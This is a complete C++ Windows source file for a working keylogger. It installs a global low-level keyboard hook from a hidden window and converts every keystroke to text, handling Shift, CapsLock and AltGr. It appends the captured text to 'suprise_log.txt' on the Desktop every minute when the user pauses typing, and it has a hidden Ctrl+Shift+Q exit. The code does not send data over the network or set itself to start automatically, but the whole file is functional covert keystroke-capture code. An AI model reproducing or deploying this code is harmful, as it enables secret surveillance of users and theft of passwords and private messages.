#include <windows.h>
#include <string>
#include <vector>
#include <mutex>
#include <condition_variable>
#include <chrono>
#include <fstream>
#include <sstream>
#include <atomic>
#include <shlobj.h> 
#include <shlwapi.h>

#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "Shlwapi.lib")

using namespace std::chrono;

// -------------------------
// Konfiguracja
// -------------------------
static std::vector<std::wstring> g_buffer;
static std::mutex g_mtx;
static std::condition_variable g_cv;

static std::atomic<bool> g_running{ true };
static std::atomic<unsigned long long> g_lastInputTickMs{ 0 };
static std::atomic<unsigned long long> g_lastIdleMarkerTickMs{ 0 };

static constexpr wchar_t kClassName[] = L"HiddenHookWindowClass";
static constexpr wchar_t kWindowName[] = L"HiddenHookWindow";
static HHOOK g_hook = nullptr;
static HWND g_hwnd = nullptr;

class UniqueHandle
{
public:
    UniqueHandle() = default;
    ~UniqueHandle()
    {
        reset();
    }

    UniqueHandle(const UniqueHandle&) = delete;
    UniqueHandle& operator=(const UniqueHandle&) = delete;

    HANDLE get() const
    {
        return value;
    }

    void reset(HANDLE newValue = nullptr)
    {
        if (value)
            CloseHandle(value);

        value = newValue;
    }

    explicit operator bool() const
    {
        return value != nullptr;
    }

private:
    HANDLE value = nullptr;
};

static UniqueHandle g_writerThread;
static UniqueHandle g_idleThread;
static DWORD  g_writerTid = 0;
static DWORD  g_idleTid = 0;

static const std::wstring fileName = L"suprise_log.txt";
static const auto kWritePeriod = std::chrono::minutes(1);
static const auto kTypingCooldown = std::chrono::milliseconds(800);  // "user is typing" window
static const auto kIdleThreshold = std::chrono::seconds(3);
static std::wstring outputFile = L"";

static void DebugLog(const std::wstring& msg);

std::wstring GetSaveDir()
{
    PWSTR path = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Desktop, 0, nullptr, &path);
    if (FAILED(hr) || !path) return L"";

    std::wstring result(path);
    CoTaskMemFree(path);
    return result;
}

std::wstring CombinePathWinApi(const std::wstring& dir, const std::wstring& file)
{
    wchar_t buffer[MAX_PATH];
    if (PathCombineW(buffer, dir.c_str(), file.c_str()))
        return buffer;

    return L"";
}

static void InitSaveFile() 
{
    std::wstring path = GetSaveDir();
    outputFile = CombinePathWinApi(path, fileName);
}

static unsigned long long NowTickMs()
{
    return GetTickCount64();
}

// Checks whether the user is actively typing.
static bool IsUserTyping()
{
    unsigned long long last = g_lastInputTickMs.load(std::memory_order_relaxed);
    unsigned long long now = NowTickMs();
    return (now - last) <= static_cast<unsigned long long>(duration_cast<milliseconds>(kTypingCooldown).count());
}

// Adds a value to the shared output buffer.
static void BufferPush(std::wstring s)
{
    {
        std::lock_guard<std::mutex> lk(g_mtx);
        g_buffer.push_back(std::move(s));
    }
    g_cv.notify_all();
}

// Writes the shared buffer to the output file.
static void FlushBufferToFile()
{
    std::vector<std::wstring> snapshot;

    {
        std::lock_guard<std::mutex> lk(g_mtx);
        snapshot.swap(g_buffer);
    }

    if (snapshot.empty())
        return;

    std::wofstream out(outputFile, std::ios::app);
    if (!out.is_open())
    {
        std::lock_guard<std::mutex> lk(g_mtx);
        g_buffer.insert(g_buffer.begin(), snapshot.begin(), snapshot.end());
        return;
    }

    SYSTEMTIME st;
    GetLocalTime(&st);

    out << L""
        << st.wYear << L"-" << st.wMonth << L"-" << st.wDay << L" "
        << st.wHour << L":" << st.wMinute << L":" << st.wSecond
        << L" ----\n";

    for (auto& line : snapshot)
        out << line;

    out << L"\n";

    if (!out)
    {
        std::lock_guard<std::mutex> lk(g_mtx);
        g_buffer.insert(g_buffer.begin(), snapshot.begin(), snapshot.end());
    }
}

// ----------------------------
// Thread: periodic file writer
// ----------------------------
static DWORD WINAPI WriterThreadProc(LPVOID)
{
    auto next = steady_clock::now() + kWritePeriod;

    std::unique_lock<std::mutex> lk(g_mtx);
    while (g_running.load())
    {
        g_cv.wait_until(lk, next, [] {
            return !g_running.load();
        });

        if (!g_running.load())
            break;

        auto now = steady_clock::now();
        if (now < next)
            continue;

        while (g_running.load() && IsUserTyping())
        {
            g_cv.wait_for(lk, std::chrono::milliseconds(100), [] {
                return !g_running.load();
            });
        }

        if (!g_running.load())
            break;

        lk.unlock();
        FlushBufferToFile();
        lk.lock();

        next = steady_clock::now() + kWritePeriod;
    }

    return 0;
}

// ----------------------------
// Thread: adds spacing when the user is idle.
// ----------------------------
static DWORD WINAPI IdleThreadProc(LPVOID)
{
    while (g_running.load())
    {
        std::unique_lock<std::mutex> lk(g_mtx);
        g_cv.wait_for(lk, std::chrono::milliseconds(200), [] {
            return !g_running.load();
        });
        lk.unlock();

        if (!g_running.load())
            break;

        unsigned long long now = NowTickMs();
        unsigned long long lastInput = g_lastInputTickMs.load(std::memory_order_relaxed);
        unsigned long long lastMarker = g_lastIdleMarkerTickMs.load(std::memory_order_relaxed);

        auto idleMs = now - lastInput;
        auto markerMs = now - lastMarker;
        auto idleThresholdMs = static_cast<unsigned long long>(duration_cast<milliseconds>(kIdleThreshold).count());

        if (idleMs >= idleThresholdMs && markerMs >= idleThresholdMs)
        {
            BufferPush(L"    "); // 4 spaces
            g_lastIdleMarkerTickMs.store(now, std::memory_order_relaxed);
        }
    }

    return 0;
}

static bool CreateThreads()
{
    unsigned long long now = NowTickMs();
    g_lastInputTickMs.store(now, std::memory_order_relaxed);
    g_lastIdleMarkerTickMs.store(now, std::memory_order_relaxed);

    g_running.store(true);

    g_writerThread.reset(CreateThread(nullptr, 0, WriterThreadProc, nullptr, 0, &g_writerTid));
    g_idleThread.reset(CreateThread(nullptr, 0, IdleThreadProc, nullptr, 0, &g_idleTid));

    if (!g_writerThread || !g_idleThread)
    {
        BufferPush(L"CreateThread failed.");
        g_running.store(false);
        g_cv.notify_all();

        HANDLE handles[2] = { g_writerThread.get(), g_idleThread.get() };
        for (auto h : handles)
        {
            if (h)
                WaitForSingleObject(h, 3000);
        }

        g_writerThread.reset();
        g_idleThread.reset();

        return false;
    }

    return true;
}

static bool CloseThreads()
{
    g_running.store(false);
    g_cv.notify_all();

    bool stoppedCleanly = true;
    HANDLE handles[2] = { g_writerThread.get(), g_idleThread.get() };
    for (auto h : handles)
    {
        if (h)
        {
            DWORD result = WaitForSingleObject(h, 3000);
            if (result != WAIT_OBJECT_0)
            {
                DebugLog(L"Thread did not stop cleanly.");
                stoppedCleanly = false;
            }
        }
    }

    g_writerThread.reset();
    g_idleThread.reset();

    return stoppedCleanly;
}

// Debug logging helper.
static void DebugLog(const std::wstring& msg)
{
    OutputDebugStringW((msg + L"\n").c_str());
}

static void SetKeyDown(BYTE ks[256], int vk, bool down)
{
    if (down) ks[vk] |= 0x80;
    else      ks[vk] &= ~0x80;
}

static void SetKeyToggled(BYTE ks[256], int vk, bool toggled)
{
    if (toggled) ks[vk] |= 0x01;
    else         ks[vk] &= ~0x01;
}

std::wstring VkCodeToUnicode(
    DWORD vkCode,
    DWORD scanCode,
    bool shift,
    bool capsLock,
    bool rightAlt // AltGr
)
{
    BYTE keyboardState[256]{};
    if (!GetKeyboardState(keyboardState))
        return L"";

    HKL layout = GetKeyboardLayout(0);

    if (scanCode == 0)
        scanCode = MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, layout);

    // Shift
    SetKeyDown(keyboardState, VK_SHIFT, shift);
    SetKeyDown(keyboardState, VK_LSHIFT, shift);
    SetKeyDown(keyboardState, VK_RSHIFT, shift);

    // CapsLock
    SetKeyToggled(keyboardState, VK_CAPITAL, capsLock);

    // Right Alt (AltGr).
    // Windows often interprets AltGr as RAlt + LCtrl.
    SetKeyDown(keyboardState, VK_RMENU, rightAlt);
    SetKeyDown(keyboardState, VK_MENU, rightAlt);

    if (rightAlt)
    {
        // Simulate Ctrl for AltGr, which is required on many layouts.
        SetKeyDown(keyboardState, VK_CONTROL, true);
        SetKeyDown(keyboardState, VK_LCONTROL, true);
    }

    WCHAR buffer[16]{};
    UINT flags = 0;

    int rc = ToUnicodeEx(
        vkCode,
        scanCode,
        keyboardState,
        buffer,
        (int)(std::size(buffer) - 1),
        flags,
        layout
    );

    if (rc == -1)
    {
        // Clear the dead-key state.
        WCHAR dummy[16]{};
        ToUnicodeEx(vkCode, scanCode, keyboardState, dummy, (int)(std::size(dummy) - 1), flags, layout);
        return L"";
    }

    if (rc > 0)
        return std::wstring(buffer, rc);

    return L"";
}

// -------------------------
// Hook proc
// -------------------------
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        auto* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            g_lastInputTickMs.store(NowTickMs(), std::memory_order_relaxed);
            // Application shutdown shortcut: Ctrl + Shift + Q.

            const bool ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
            const bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            const bool capsLock = (GetAsyncKeyState(VK_CAPITAL) & 0x8000) != 0;
            const bool rAlt = (GetAsyncKeyState(VK_RMENU) & 0x8000) != 0;

            if (ctrl && shift && kb->vkCode == 'Q')
            {
                DebugLog(L"[hook] Ctrl+Shift+Q -> exiting");
                if (g_hwnd)
                    PostMessageW(g_hwnd, WM_CLOSE, 0, 0);
                return 1; 
            }

            std::wstring ch = VkCodeToUnicode(kb->vkCode, kb->scanCode, shift, capsLock, rAlt);
            
            if (!ch.empty())
            {
                BufferPush(ch);
                OutputDebugStringW((L"Char: " + ch + L"\n").c_str());
            }
        }
    }

    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// -------------------------
// Instalacja hooka
// -------------------------
static bool InstallHook()
{
    HINSTANCE hInst = GetModuleHandleW(nullptr);

    g_hook = SetWindowsHookExW(
        WH_KEYBOARD_LL,
        LowLevelKeyboardProc,
        hInst,
        0
    );

    if (!g_hook)
    {
        DebugLog(L"[hook] SetWindowsHookExW failed, err=" + std::to_wstring(GetLastError()));
        return false;
    }

    DebugLog(L"[hook] Installed WH_KEYBOARD_LL");
    return true;
}

static void UninstallHook()
{
    if (g_hook)
    {
        UnhookWindowsHookEx(g_hook);
        g_hook = nullptr;
        DebugLog(L"[hook] Uninstalled");
    }
}

// -------------------------
// WndProc (ukryte okno)
// -------------------------
static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
        case WM_CREATE:        
        InitSaveFile();
        // Install the hook after the hidden window is created.
        if (!InstallHook())
            return -1;

        if (!CreateThreads())
        {
            UninstallHook();
            return -1;
        }

        BufferPush(L"App started. \n");
        return 0;

        case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;

        case WM_DESTROY:
        UninstallHook();
        CloseThreads();
        
        // Final flush
        FlushBufferToFile();

        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

// -------------------------
// WinMain
// -------------------------
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
{
    // Register the window class.
    WNDCLASSEXW wc{};
    wc.cbSize = sizeof(wc);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = kClassName;

    if (!RegisterClassExW(&wc))
        return 1;

    // Create a hidden window without calling ShowWindow.
    g_hwnd = CreateWindowExW(
        0,
        kClassName,
        kWindowName,
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
        nullptr,
        nullptr,
        hInstance,
        nullptr
    );

    if (!g_hwnd)
        return 2;

    // The window remains hidden because ShowWindow/UpdateWindow are not called.

    DebugLog(L"[app] Running hidden. Press Ctrl+Shift+Q to exit.");
    
    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    return 0;
}
